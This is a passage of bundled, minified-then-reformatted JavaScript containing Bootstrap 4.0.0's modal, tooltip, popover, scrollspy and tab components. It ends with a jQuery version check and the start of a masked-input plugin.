                        : this._hideModal();
                  }
                }
              }),
              (f.dispose = function () {
                e.removeData(this._element, t),
                  e(window, document, this._element, this._backdrop).off(n),
                  (this._config = null),
                  (this._element = null),
                  (this._dialog = null),
                  (this._backdrop = null),
                  (this._isShown = null),
                  (this._isBodyOverflowing = null),
                  (this._ignoreBackdropClick = null),
                  (this._scrollbarWidth = null);
              }),
              (f.handleUpdate = function () {
                this._adjustDialog();
              }),
              (f._getConfig = function (e) {
                return (e = r({}, s, e)), k.typeCheckConfig("modal", e, a), e;
              }),
              (f._showElement = function (t) {
                var n = this,
                  i = k.supportsTransitionEnd() && e(this._element).hasClass(u);
                (this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE) || document.body.appendChild(this._element),
                  (this._element.style.display = "block"),
                  this._element.removeAttribute("aria-hidden"),
                  (this._element.scrollTop = 0),
                  i && k.reflow(this._element),
                  e(this._element).addClass(d),
                  this._config.focus && this._enforceFocus();
                var o = e.Event(l.SHOWN, { relatedTarget: t }),
                  r = function () {
                    n._config.focus && n._element.focus(), (n._isTransitioning = !1), e(n._element).trigger(o);
                  };
                i ? e(this._dialog).one(k.TRANSITION_END, r).emulateTransitionEnd(300) : r();
              }),
              (f._enforceFocus = function () {
                var t = this;
                e(document)
                  .off(l.FOCUSIN)
                  .on(l.FOCUSIN, function (n) {
                    document !== n.target && t._element !== n.target && 0 === e(t._element).has(n.target).length && t._element.focus();
                  });
              }),
              (f._setEscapeEvent = function () {
                var t = this;
                this._isShown && this._config.keyboard
                  ? e(this._element).on(l.KEYDOWN_DISMISS, function (e) {
                      27 === e.which && (e.preventDefault(), t.hide());
                    })
                  : this._isShown || e(this._element).off(l.KEYDOWN_DISMISS);
              }),
              (f._setResizeEvent = function () {
                var t = this;
                this._isShown
                  ? e(window).on(l.RESIZE, function (e) {
                      return t.handleUpdate(e);
                    })
                  : e(window).off(l.RESIZE);
              }),
              (f._hideModal = function () {
                var t = this;
                (this._element.style.display = "none"),
                  this._element.setAttribute("aria-hidden", !0),
                  (this._isTransitioning = !1),
                  this._showBackdrop(function () {
                    e(document.body).removeClass(c), t._resetAdjustments(), t._resetScrollbar(), e(t._element).trigger(l.HIDDEN);
                  });
              }),
              (f._removeBackdrop = function () {
                this._backdrop && (e(this._backdrop).remove(), (this._backdrop = null));
              }),
              (f._showBackdrop = function (t) {
                var n = this,
                  i = e(this._element).hasClass(u) ? u : "";
                if (this._isShown && this._config.backdrop) {
                  var o = k.supportsTransitionEnd() && i;
                  if (
                    ((this._backdrop = document.createElement("div")),
                    (this._backdrop.className = "modal-backdrop"),
                    i && e(this._backdrop).addClass(i),
                    e(this._backdrop).appendTo(document.body),
                    e(this._element).on(l.CLICK_DISMISS, function (e) {
                      n._ignoreBackdropClick ? (n._ignoreBackdropClick = !1) : e.target === e.currentTarget && ("static" === n._config.backdrop ? n._element.focus() : n.hide());
                    }),
                    o && k.reflow(this._backdrop),
                    e(this._backdrop).addClass(d),
                    !t)
                  )
                    return;
                  if (!o) return void t();
                  e(this._backdrop).one(k.TRANSITION_END, t).emulateTransitionEnd(150);
                } else if (!this._isShown && this._backdrop) {
                  e(this._backdrop).removeClass(d);
                  var r = function () {
                    n._removeBackdrop(), t && t();
                  };
                  k.supportsTransitionEnd() && e(this._element).hasClass(u) ? e(this._backdrop).one(k.TRANSITION_END, r).emulateTransitionEnd(150) : r();
                } else t && t();
              }),
              (f._adjustDialog = function () {
                var e = this._element.scrollHeight > document.documentElement.clientHeight;
                !this._isBodyOverflowing && e && (this._element.style.paddingLeft = this._scrollbarWidth + "px"), this._isBodyOverflowing && !e && (this._element.style.paddingRight = this._scrollbarWidth + "px");
              }),
              (f._resetAdjustments = function () {
                (this._element.style.paddingLeft = ""), (this._element.style.paddingRight = "");
              }),
              (f._checkScrollbar = function () {
                var e = document.body.getBoundingClientRect();
                (this._isBodyOverflowing = e.left + e.right < window.innerWidth), (this._scrollbarWidth = this._getScrollbarWidth());
              }),
              (f._setScrollbar = function () {
                var t = this;
                if (this._isBodyOverflowing) {
                  e(g).each(function (n, i) {
                    var o = e(i)[0].style.paddingRight,
                      r = e(i).css("padding-right");
                    e(i)
                      .data("padding-right", o)
                      .css("padding-right", parseFloat(r) + t._scrollbarWidth + "px");
                  }),
                    e(m).each(function (n, i) {
                      var o = e(i)[0].style.marginRight,
                        r = e(i).css("margin-right");
                      e(i)
                        .data("margin-right", o)
                        .css("margin-right", parseFloat(r) - t._scrollbarWidth + "px");
                    }),
                    e(v).each(function (n, i) {
                      var o = e(i)[0].style.marginRight,
                        r = e(i).css("margin-right");
                      e(i)
                        .data("margin-right", o)
                        .css("margin-right", parseFloat(r) + t._scrollbarWidth + "px");
                    });
                  var n = document.body.style.paddingRight,
                    i = e("body").css("padding-right");
                  e("body")
                    .data("padding-right", n)
                    .css("padding-right", parseFloat(i) + this._scrollbarWidth + "px");
                }
              }),
              (f._resetScrollbar = function () {
                e(g).each(function (t, n) {
                  var i = e(n).data("padding-right");
                  void 0 !== i && e(n).css("padding-right", i).removeData("padding-right");
                }),
                  e(m + ", " + v).each(function (t, n) {
                    var i = e(n).data("margin-right");
                    void 0 !== i && e(n).css("margin-right", i).removeData("margin-right");
                  });
                var t = e("body").data("padding-right");
                void 0 !== t && e("body").css("padding-right", t).removeData("padding-right");
              }),
              (f._getScrollbarWidth = function () {
                var e = document.createElement("div");
                (e.className = "modal-scrollbar-measure"), document.body.appendChild(e);
                var t = e.getBoundingClientRect().width - e.clientWidth;
                return document.body.removeChild(e), t;
              }),
              (i._jQueryInterface = function (n, o) {
                return this.each(function () {
                  var s = e(this).data(t),
                    a = r({}, i.Default, e(this).data(), "object" == typeof n && n);
                  if ((s || ((s = new i(this, a)), e(this).data(t, s)), "string" == typeof n)) {
                    if (void 0 === s[n]) throw new TypeError('No method named "' + n + '"');
                    s[n](o);
                  } else a.show && s.show(o);
                });
              }),
              o(i, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return s;
                  },
                },
              ]),
              i
            );
          })();
        return (
          e(document).on(l.CLICK_DATA_API, f, function (n) {
            var i,
              o = this,
              s = k.getSelectorFromElement(this);
            s && (i = e(s)[0]);
            var a = e(i).data(t) ? "toggle" : r({}, e(i).data(), e(this).data());
            ("A" !== this.tagName && "AREA" !== this.tagName) || n.preventDefault();
            var c = e(i).one(l.SHOW, function (t) {
              t.isDefaultPrevented() ||
                c.one(l.HIDDEN, function () {
                  e(o).is(":visible") && o.focus();
                });
            });
            y._jQueryInterface.call(e(i), a, this);
          }),
          (e.fn.modal = y._jQueryInterface),
          (e.fn.modal.Constructor = y),
          (e.fn.modal.noConflict = function () {
            return (e.fn.modal = i), y._jQueryInterface;
          }),
          y
        );
      })(t),
      I = (function (e) {
        var t = "tooltip",
          i = "bs.tooltip",
          s = "." + i,
          a = e.fn[t],
          l = new RegExp("(^|\\s)bs-tooltip\\S+", "g"),
          c = {
            animation: "boolean",
            template: "string",
            title: "(string|element|function)",
            trigger: "string",
            delay: "(number|object)",
            html: "boolean",
            selector: "(string|boolean)",
            placement: "(string|function)",
            offset: "(number|string)",
            container: "(string|element|boolean)",
            fallbackPlacement: "(string|array)",
            boundary: "(string|element)",
          },
          u = { AUTO: "auto", TOP: "top", RIGHT: "right", BOTTOM: "bottom", LEFT: "left" },
          d = {
            animation: !0,
            template: '<div class="tooltip" role="tooltip"><div class="arrow"></div><div class="tooltip-inner"></div></div>',
            trigger: "hover focus",
            title: "",
            delay: 0,
            html: !1,
            selector: !1,
            placement: "top",
            offset: 0,
            container: !1,
            fallbackPlacement: "flip",
            boundary: "scrollParent",
          },
          p = "show",
          f = "out",
          h = {
            HIDE: "hide" + s,
            HIDDEN: "hidden" + s,
            SHOW: "show" + s,
            SHOWN: "shown" + s,
            INSERTED: "inserted" + s,
            CLICK: "click" + s,
            FOCUSIN: "focusin" + s,
            FOCUSOUT: "focusout" + s,
            MOUSEENTER: "mouseenter" + s,
            MOUSELEAVE: "mouseleave" + s,
          },
          g = "fade",
          m = "show",
          v = "hover",
          y = "focus",
          w = (function () {
            function a(e, t) {
              if (void 0 === n) throw new TypeError("Bootstrap tooltips require Popper.js (https://popper.js.org)");
              (this._isEnabled = !0), (this._timeout = 0), (this._hoverState = ""), (this._activeTrigger = {}), (this._popper = null), (this.element = e), (this.config = this._getConfig(t)), (this.tip = null), this._setListeners();
            }
            var w = a.prototype;
            return (
              (w.enable = function () {
                this._isEnabled = !0;
              }),
              (w.disable = function () {
                this._isEnabled = !1;
              }),
              (w.toggleEnabled = function () {
                this._isEnabled = !this._isEnabled;
              }),
              (w.toggle = function (t) {
                if (this._isEnabled)
                  if (t) {
                    var n = this.constructor.DATA_KEY,
                      i = e(t.currentTarget).data(n);
                    i || ((i = new this.constructor(t.currentTarget, this._getDelegateConfig())), e(t.currentTarget).data(n, i)),
                      (i._activeTrigger.click = !i._activeTrigger.click),
                      i._isWithActiveTrigger() ? i._enter(null, i) : i._leave(null, i);
                  } else {
                    if (e(this.getTipElement()).hasClass(m)) return void this._leave(null, this);
                    this._enter(null, this);
                  }
              }),
              (w.dispose = function () {
                clearTimeout(this._timeout),
                  e.removeData(this.element, this.constructor.DATA_KEY),
                  e(this.element).off(this.constructor.EVENT_KEY),
                  e(this.element).closest(".modal").off("hide.bs.modal"),
                  this.tip && e(this.tip).remove(),
                  (this._isEnabled = null),
                  (this._timeout = null),
                  (this._hoverState = null),
                  (this._activeTrigger = null),
                  null !== this._popper && this._popper.destroy(),
                  (this._popper = null),
                  (this.element = null),
                  (this.config = null),
                  (this.tip = null);
              }),
              (w.show = function () {
                var t = this;
                if ("none" === e(this.element).css("display")) throw new Error("Please use show on visible elements");
                var i = e.Event(this.constructor.Event.SHOW);
                if (this.isWithContent() && this._isEnabled) {
                  e(this.element).trigger(i);
                  var o = e.contains(this.element.ownerDocument.documentElement, this.element);
                  if (i.isDefaultPrevented() || !o) return;
                  var r = this.getTipElement(),
                    s = k.getUID(this.constructor.NAME);
                  r.setAttribute("id", s), this.element.setAttribute("aria-describedby", s), this.setContent(), this.config.animation && e(r).addClass(g);
                  var l = "function" == typeof this.config.placement ? this.config.placement.call(this, r, this.element) : this.config.placement,
                    c = this._getAttachment(l);
                  this.addAttachmentClass(c);
                  var u = !1 === this.config.container ? document.body : e(this.config.container);
                  e(r).data(this.constructor.DATA_KEY, this),
                    e.contains(this.element.ownerDocument.documentElement, this.tip) || e(r).appendTo(u),
                    e(this.element).trigger(this.constructor.Event.INSERTED),
                    (this._popper = new n(this.element, r, {
                      placement: c,
                      modifiers: {
                        offset: { offset: this.config.offset },
                        flip: { behavior: this.config.fallbackPlacement },
                        arrow: { element: ".arrow" },
                        preventOverflow: { boundariesElement: this.config.boundary },
                      },
                      onCreate: function (e) {
                        e.originalPlacement !== e.placement && t._handlePopperPlacementChange(e);
                      },
                      onUpdate: function (e) {
                        t._handlePopperPlacementChange(e);
                      },
                    })),
                    e(r).addClass(m),
                    "ontouchstart" in document.documentElement && e("body").children().on("mouseover", null, e.noop);
                  var d = function () {
                    t.config.animation && t._fixTransition();
                    var n = t._hoverState;
                    (t._hoverState = null), e(t.element).trigger(t.constructor.Event.SHOWN), n === f && t._leave(null, t);
                  };
                  k.supportsTransitionEnd() && e(this.tip).hasClass(g) ? e(this.tip).one(k.TRANSITION_END, d).emulateTransitionEnd(a._TRANSITION_DURATION) : d();
                }
              }),
              (w.hide = function (t) {
                var n = this,
                  i = this.getTipElement(),
                  o = e.Event(this.constructor.Event.HIDE),
                  r = function () {
                    n._hoverState !== p && i.parentNode && i.parentNode.removeChild(i),
                      n._cleanTipClass(),
                      n.element.removeAttribute("aria-describedby"),
                      e(n.element).trigger(n.constructor.Event.HIDDEN),
                      null !== n._popper && n._popper.destroy(),
                      t && t();
                  };
                e(this.element).trigger(o),
                  o.isDefaultPrevented() ||
                    (e(i).removeClass(m),
                    "ontouchstart" in document.documentElement && e("body").children().off("mouseover", null, e.noop),
                    (this._activeTrigger.click = !1),
                    (this._activeTrigger[y] = !1),
                    (this._activeTrigger[v] = !1),
                    k.supportsTransitionEnd() && e(this.tip).hasClass(g) ? e(i).one(k.TRANSITION_END, r).emulateTransitionEnd(150) : r(),
                    (this._hoverState = ""));
              }),
              (w.update = function () {
                null !== this._popper && this._popper.scheduleUpdate();
              }),
              (w.isWithContent = function () {
                return Boolean(this.getTitle());
              }),
              (w.addAttachmentClass = function (t) {
                e(this.getTipElement()).addClass("bs-tooltip-" + t);
              }),
              (w.getTipElement = function () {
                return (this.tip = this.tip || e(this.config.template)[0]), this.tip;
              }),
              (w.setContent = function () {
                var t = e(this.getTipElement());
                this.setElementContent(t.find(".tooltip-inner"), this.getTitle()), t.removeClass(g + " " + m);
              }),
              (w.setElementContent = function (t, n) {
                var i = this.config.html;
                "object" == typeof n && (n.nodeType || n.jquery) ? (i ? e(n).parent().is(t) || t.empty().append(n) : t.text(e(n).text())) : t[i ? "html" : "text"](n);
              }),
              (w.getTitle = function () {
                var e = this.element.getAttribute("data-original-title");
                return e || (e = "function" == typeof this.config.title ? this.config.title.call(this.element) : this.config.title), e;
              }),
              (w._getAttachment = function (e) {
                return u[e.toUpperCase()];
              }),
              (w._setListeners = function () {
                var t = this;
                this.config.trigger.split(" ").forEach(function (n) {
                  if ("click" === n)
                    e(t.element).on(t.constructor.Event.CLICK, t.config.selector, function (e) {
                      return t.toggle(e);
                    });
                  else if ("manual" !== n) {
                    var i = n === v ? t.constructor.Event.MOUSEENTER : t.constructor.Event.FOCUSIN,
                      o = n === v ? t.constructor.Event.MOUSELEAVE : t.constructor.Event.FOCUSOUT;
                    e(t.element)
                      .on(i, t.config.selector, function (e) {
                        return t._enter(e);
                      })
                      .on(o, t.config.selector, function (e) {
                        return t._leave(e);
                      });
                  }
                  e(t.element)
                    .closest(".modal")
                    .on("hide.bs.modal", function () {
                      return t.hide();
                    });
                }),
                  this.config.selector ? (this.config = r({}, this.config, { trigger: "manual", selector: "" })) : this._fixTitle();
              }),
              (w._fixTitle = function () {
                var e = typeof this.element.getAttribute("data-original-title");
                (this.element.getAttribute("title") || "string" !== e) && (this.element.setAttribute("data-original-title", this.element.getAttribute("title") || ""), this.element.setAttribute("title", ""));
              }),
              (w._enter = function (t, n) {
                var i = this.constructor.DATA_KEY;
                (n = n || e(t.currentTarget).data(i)) || ((n = new this.constructor(t.currentTarget, this._getDelegateConfig())), e(t.currentTarget).data(i, n)),
                  t && (n._activeTrigger["focusin" === t.type ? y : v] = !0),
                  e(n.getTipElement()).hasClass(m) || n._hoverState === p
                    ? (n._hoverState = p)
                    : (clearTimeout(n._timeout),
                      (n._hoverState = p),
                      n.config.delay && n.config.delay.show
                        ? (n._timeout = setTimeout(function () {
                            n._hoverState === p && n.show();
                          }, n.config.delay.show))
                        : n.show());
              }),
              (w._leave = function (t, n) {
                var i = this.constructor.DATA_KEY;
                (n = n || e(t.currentTarget).data(i)) || ((n = new this.constructor(t.currentTarget, this._getDelegateConfig())), e(t.currentTarget).data(i, n)),
                  t && (n._activeTrigger["focusout" === t.type ? y : v] = !1),
                  n._isWithActiveTrigger() ||
                    (clearTimeout(n._timeout),
                    (n._hoverState = f),
                    n.config.delay && n.config.delay.hide
                      ? (n._timeout = setTimeout(function () {
                          n._hoverState === f && n.hide();
                        }, n.config.delay.hide))
                      : n.hide());
              }),
              (w._isWithActiveTrigger = function () {
                for (var e in this._activeTrigger) if (this._activeTrigger[e]) return !0;
                return !1;
              }),
              (w._getConfig = function (n) {
                return (
                  "number" == typeof (n = r({}, this.constructor.Default, e(this.element).data(), n)).delay && (n.delay = { show: n.delay, hide: n.delay }),
                  "number" == typeof n.title && (n.title = n.title.toString()),
                  "number" == typeof n.content && (n.content = n.content.toString()),
                  k.typeCheckConfig(t, n, this.constructor.DefaultType),
                  n
                );
              }),
              (w._getDelegateConfig = function () {
                var e = {};
                if (this.config) for (var t in this.config) this.constructor.Default[t] !== this.config[t] && (e[t] = this.config[t]);
                return e;
              }),
              (w._cleanTipClass = function () {
                var t = e(this.getTipElement()),
                  n = t.attr("class").match(l);
                null !== n && n.length > 0 && t.removeClass(n.join(""));
              }),
              (w._handlePopperPlacementChange = function (e) {
                this._cleanTipClass(), this.addAttachmentClass(this._getAttachment(e.placement));
              }),
              (w._fixTransition = function () {
                var t = this.getTipElement(),
                  n = this.config.animation;
                null === t.getAttribute("x-placement") && (e(t).removeClass(g), (this.config.animation = !1), this.hide(), this.show(), (this.config.animation = n));
              }),
              (a._jQueryInterface = function (t) {
                return this.each(function () {
                  var n = e(this).data(i),
                    o = "object" == typeof t && t;
                  if ((n || !/dispose|hide/.test(t)) && (n || ((n = new a(this, o)), e(this).data(i, n)), "string" == typeof t)) {
                    if (void 0 === n[t]) throw new TypeError('No method named "' + t + '"');
                    n[t]();
                  }
                });
              }),
              o(a, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return d;
                  },
                },
                {
                  key: "NAME",
                  get: function () {
                    return t;
                  },
                },
                {
                  key: "DATA_KEY",
                  get: function () {
                    return i;
                  },
                },
                {
                  key: "Event",
                  get: function () {
                    return h;
                  },
                },
                {
                  key: "EVENT_KEY",
                  get: function () {
                    return s;
                  },
                },
                {
                  key: "DefaultType",
                  get: function () {
                    return c;
                  },
                },
              ]),
              a
            );
          })();
        return (
          (e.fn[t] = w._jQueryInterface),
          (e.fn[t].Constructor = w),
          (e.fn[t].noConflict = function () {
            return (e.fn[t] = a), w._jQueryInterface;
          }),
          w
        );
      })(t),
      $ = (function (e) {
        var t = "popover",
          n = "bs.popover",
          i = "." + n,
          s = e.fn[t],
          a = new RegExp("(^|\\s)bs-popover\\S+", "g"),
          l = r({}, I.Default, {
            placement: "right",
            trigger: "click",
            content: "",
            template: '<div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',
          }),
          c = r({}, I.DefaultType, { content: "(string|element|function)" }),
          u = {
            HIDE: "hide" + i,
            HIDDEN: "hidden" + i,
            SHOW: "show" + i,
            SHOWN: "shown" + i,
            INSERTED: "inserted" + i,
            CLICK: "click" + i,
            FOCUSIN: "focusin" + i,
            FOCUSOUT: "focusout" + i,
            MOUSEENTER: "mouseenter" + i,
            MOUSELEAVE: "mouseleave" + i,
          },
          d = (function (r) {
            function s() {
              return r.apply(this, arguments) || this;
            }
            var d, p;
            (p = r), ((d = s).prototype = Object.create(p.prototype)), (d.prototype.constructor = d), (d.__proto__ = p);
            var f = s.prototype;
            return (
              (f.isWithContent = function () {
                return this.getTitle() || this._getContent();
              }),
              (f.addAttachmentClass = function (t) {
                e(this.getTipElement()).addClass("bs-popover-" + t);
              }),
              (f.getTipElement = function () {
                return (this.tip = this.tip || e(this.config.template)[0]), this.tip;
              }),
              (f.setContent = function () {
                var t = e(this.getTipElement());
                this.setElementContent(t.find(".popover-header"), this.getTitle());
                var n = this._getContent();
                "function" == typeof n && (n = n.call(this.element)), this.setElementContent(t.find(".popover-body"), n), t.removeClass("fade show");
              }),
              (f._getContent = function () {
                return this.element.getAttribute("data-content") || this.config.content;
              }),
              (f._cleanTipClass = function () {
                var t = e(this.getTipElement()),
                  n = t.attr("class").match(a);
                null !== n && n.length > 0 && t.removeClass(n.join(""));
              }),
              (s._jQueryInterface = function (t) {
                return this.each(function () {
                  var i = e(this).data(n),
                    o = "object" == typeof t ? t : null;
                  if ((i || !/destroy|hide/.test(t)) && (i || ((i = new s(this, o)), e(this).data(n, i)), "string" == typeof t)) {
                    if (void 0 === i[t]) throw new TypeError('No method named "' + t + '"');
                    i[t]();
                  }
                });
              }),
              o(s, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return l;
                  },
                },
                {
                  key: "NAME",
                  get: function () {
                    return t;
                  },
                },
                {
                  key: "DATA_KEY",
                  get: function () {
                    return n;
                  },
                },
                {
                  key: "Event",
                  get: function () {
                    return u;
                  },
                },
                {
                  key: "EVENT_KEY",
                  get: function () {
                    return i;
                  },
                },
                {
                  key: "DefaultType",
                  get: function () {
                    return c;
                  },
                },
              ]),
              s
            );
          })(I);
        return (
          (e.fn[t] = d._jQueryInterface),
          (e.fn[t].Constructor = d),
          (e.fn[t].noConflict = function () {
            return (e.fn[t] = s), d._jQueryInterface;
          }),
          d
        );
      })(t),
      O = (function (e) {
        var t = "scrollspy",
          n = "bs.scrollspy",
          i = "." + n,
          s = e.fn[t],
          a = { offset: 10, method: "auto", target: "" },
          l = { offset: "number", method: "string", target: "(string|element)" },
          c = { ACTIVATE: "activate" + i, SCROLL: "scroll" + i, LOAD_DATA_API: "load" + i + ".data-api" },
          u = "active",
          d = '[data-spy="scroll"]',
          p = ".active",
          f = ".nav, .list-group",
          h = ".nav-link",
          g = ".nav-item",
          m = ".list-group-item",
          v = ".dropdown",
          y = ".dropdown-item",
          w = ".dropdown-toggle",
          b = "position",
          T = (function () {
            function s(t, n) {
              var i = this;
              (this._element = t),
                (this._scrollElement = "BODY" === t.tagName ? window : t),
                (this._config = this._getConfig(n)),
                (this._selector = this._config.target + " " + h + "," + this._config.target + " " + m + "," + this._config.target + " " + y),
                (this._offsets = []),
                (this._targets = []),
                (this._activeTarget = null),
                (this._scrollHeight = 0),
                e(this._scrollElement).on(c.SCROLL, function (e) {
                  return i._process(e);
                }),
                this.refresh(),
                this._process();
            }
            var d = s.prototype;
            return (
              (d.refresh = function () {
                var t = this,
                  n = this._scrollElement === this._scrollElement.window ? "offset" : b,
                  i = "auto" === this._config.method ? n : this._config.method,
                  o = i === b ? this._getScrollTop() : 0;
                (this._offsets = []),
                  (this._targets = []),
                  (this._scrollHeight = this._getScrollHeight()),
                  e
                    .makeArray(e(this._selector))
                    .map(function (t) {
                      var n,
                        r = k.getSelectorFromElement(t);
                      if ((r && (n = e(r)[0]), n)) {
                        var s = n.getBoundingClientRect();
                        if (s.width || s.height) return [e(n)[i]().top + o, r];
                      }
                      return null;
                    })
                    .filter(function (e) {
                      return e;
                    })
                    .sort(function (e, t) {
                      return e[0] - t[0];
                    })
                    .forEach(function (e) {
                      t._offsets.push(e[0]), t._targets.push(e[1]);
                    });
              }),
              (d.dispose = function () {
                e.removeData(this._element, n),
                  e(this._scrollElement).off(i),
                  (this._element = null),
                  (this._scrollElement = null),
                  (this._config = null),
                  (this._selector = null),
                  (this._offsets = null),
                  (this._targets = null),
                  (this._activeTarget = null),
                  (this._scrollHeight = null);
              }),
              (d._getConfig = function (n) {
                if ("string" != typeof (n = r({}, a, n)).target) {
                  var i = e(n.target).attr("id");
                  i || ((i = k.getUID(t)), e(n.target).attr("id", i)), (n.target = "#" + i);
                }
                return k.typeCheckConfig(t, n, l), n;
              }),
              (d._getScrollTop = function () {
                return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop;
              }),
              (d._getScrollHeight = function () {
                return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
              }),
              (d._getOffsetHeight = function () {
                return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height;
              }),
              (d._process = function () {
                var e = this._getScrollTop() + this._config.offset,
                  t = this._getScrollHeight(),
                  n = this._config.offset + t - this._getOffsetHeight();
                if ((this._scrollHeight !== t && this.refresh(), e >= n)) {
                  var i = this._targets[this._targets.length - 1];
                  this._activeTarget !== i && this._activate(i);
                } else {
                  if (this._activeTarget && e < this._offsets[0] && this._offsets[0] > 0) return (this._activeTarget = null), void this._clear();
                  for (var o = this._offsets.length; o--; ) this._activeTarget !== this._targets[o] && e >= this._offsets[o] && (void 0 === this._offsets[o + 1] || e < this._offsets[o + 1]) && this._activate(this._targets[o]);
                }
              }),
              (d._activate = function (t) {
                (this._activeTarget = t), this._clear();
                var n = this._selector.split(",");
                n = n.map(function (e) {
                  return e + '[data-target="' + t + '"],' + e + '[href="' + t + '"]';
                });
                var i = e(n.join(","));
                i.hasClass("dropdown-item")
                  ? (i.closest(v).find(w).addClass(u), i.addClass(u))
                  : (i.addClass(u),
                    i
                      .parents(f)
                      .prev(h + ", " + m)
                      .addClass(u),
                    i.parents(f).prev(g).children(h).addClass(u)),
                  e(this._scrollElement).trigger(c.ACTIVATE, { relatedTarget: t });
              }),
              (d._clear = function () {
                e(this._selector).filter(p).removeClass(u);
              }),
              (s._jQueryInterface = function (t) {
                return this.each(function () {
                  var i = e(this).data(n);
                  if ((i || ((i = new s(this, "object" == typeof t && t)), e(this).data(n, i)), "string" == typeof t)) {
                    if (void 0 === i[t]) throw new TypeError('No method named "' + t + '"');
                    i[t]();
                  }
                });
              }),
              o(s, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return a;
                  },
                },
              ]),
              s
            );
          })();
        return (
          e(window).on(c.LOAD_DATA_API, function () {
            for (var t = e.makeArray(e(d)), n = t.length; n--; ) {
              var i = e(t[n]);
              T._jQueryInterface.call(i, i.data());
            }
          }),
          (e.fn[t] = T._jQueryInterface),
          (e.fn[t].Constructor = T),
          (e.fn[t].noConflict = function () {
            return (e.fn[t] = s), T._jQueryInterface;
          }),
          T
        );
      })(t),
      j = (function (e) {
        var t = "bs.tab",
          n = "." + t,
          i = e.fn.tab,
          r = { HIDE: "hide" + n, HIDDEN: "hidden" + n, SHOW: "show" + n, SHOWN: "shown" + n, CLICK_DATA_API: "click.bs.tab.data-api" },
          s = "active",
          a = "show",
          l = ".active",
          c = "> li > .active",
          u = (function () {
            function n(e) {
              this._element = e;
            }
            var i = n.prototype;
            return (
              (i.show = function () {
                var t = this;
                if (!((this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && e(this._element).hasClass(s)) || e(this._element).hasClass("disabled"))) {
                  var n,
                    i,
                    o = e(this._element).closest(".nav, .list-group")[0],
                    a = k.getSelectorFromElement(this._element);
                  if (o) {
                    var u = "UL" === o.nodeName ? c : l;
                    i = (i = e.makeArray(e(o).find(u)))[i.length - 1];
                  }
                  var d = e.Event(r.HIDE, { relatedTarget: this._element }),
                    p = e.Event(r.SHOW, { relatedTarget: i });
                  if ((i && e(i).trigger(d), e(this._element).trigger(p), !p.isDefaultPrevented() && !d.isDefaultPrevented())) {
                    a && (n = e(a)[0]), this._activate(this._element, o);
                    var f = function () {
                      var n = e.Event(r.HIDDEN, { relatedTarget: t._element }),
                        o = e.Event(r.SHOWN, { relatedTarget: i });
                      e(i).trigger(n), e(t._element).trigger(o);
                    };
                    n ? this._activate(n, n.parentNode, f) : f();
                  }
                }
              }),
              (i.dispose = function () {
                e.removeData(this._element, t), (this._element = null);
              }),
              (i._activate = function (t, n, i) {
                var o = this,
                  r = ("UL" === n.nodeName ? e(n).find(c) : e(n).children(l))[0],
                  s = i && k.supportsTransitionEnd() && r && e(r).hasClass("fade"),
                  a = function () {
                    return o._transitionComplete(t, r, i);
                  };
                r && s ? e(r).one(k.TRANSITION_END, a).emulateTransitionEnd(150) : a();
              }),
              (i._transitionComplete = function (t, n, i) {
                if (n) {
                  e(n).removeClass(a + " " + s);
                  var o = e(n.parentNode).find("> .dropdown-menu .active")[0];
                  o && e(o).removeClass(s), "tab" === n.getAttribute("role") && n.setAttribute("aria-selected", !1);
                }
                if ((e(t).addClass(s), "tab" === t.getAttribute("role") && t.setAttribute("aria-selected", !0), k.reflow(t), e(t).addClass(a), t.parentNode && e(t.parentNode).hasClass("dropdown-menu"))) {
                  var r = e(t).closest(".dropdown")[0];
                  r && e(r).find(".dropdown-toggle").addClass(s), t.setAttribute("aria-expanded", !0);
                }
                i && i();
              }),
              (n._jQueryInterface = function (i) {
                return this.each(function () {
                  var o = e(this),
                    r = o.data(t);
                  if ((r || ((r = new n(this)), o.data(t, r)), "string" == typeof i)) {
                    if (void 0 === r[i]) throw new TypeError('No method named "' + i + '"');
                    r[i]();
                  }
                });
              }),
              o(n, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
              ]),
              n
            );
          })();
        return (
          e(document).on(r.CLICK_DATA_API, '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]', function (t) {
            t.preventDefault(), u._jQueryInterface.call(e(this), "show");
          }),
          (e.fn.tab = u._jQueryInterface),
          (e.fn.tab.Constructor = u),
          (e.fn.tab.noConflict = function () {
            return (e.fn.tab = i), u._jQueryInterface;
          }),
          u
        );
      })(t);
    !(function (e) {
      if (void 0 === e) throw new TypeError("Bootstrap's JavaScript requires jQuery. jQuery must be included before Bootstrap's JavaScript.");
      var t = e.fn.jquery.split(" ")[0].split(".");
      if ((t[0] < 2 && t[1] < 9) || (1 === t[0] && 9 === t[1] && t[2] < 1) || t[0] >= 4) throw new Error("Bootstrap's JavaScript requires at least jQuery v1.9.1 but less than v4.0.0");
    })(t),
      (e.Util = k),
      (e.Alert = S),
      (e.Button = x),
      (e.Carousel = E),
      (e.Collapse = A),
      (e.Dropdown = D),
      (e.Modal = N),
      (e.Popover = $),
      (e.Scrollspy = O),
      (e.Tab = j),
      (e.Tooltip = I),
      Object.defineProperty(e, "__esModule", { value: !0 });
  }),
  (function (e) {
    "function" == typeof define && define.amd ? define(["jquery"], e) : e("object" == typeof exports ? require("jquery") : jQuery);
  })(function (e) {
    var t,
      n = navigator.userAgent,
      i = /iphone/i.test(n),
      o = /chrome/i.test(n),
      r = /android/i.test(n);
    (e.mask = { definitions: { 9: "[0-9]", a: "[A-Za-z]", "*": "[A-Za-z0-9]" }, autoclear: !0, dataName: "rawMaskFn", placeholder: "_" }),
      e.fn.extend({
        caret: function (e, t) {
          var n;
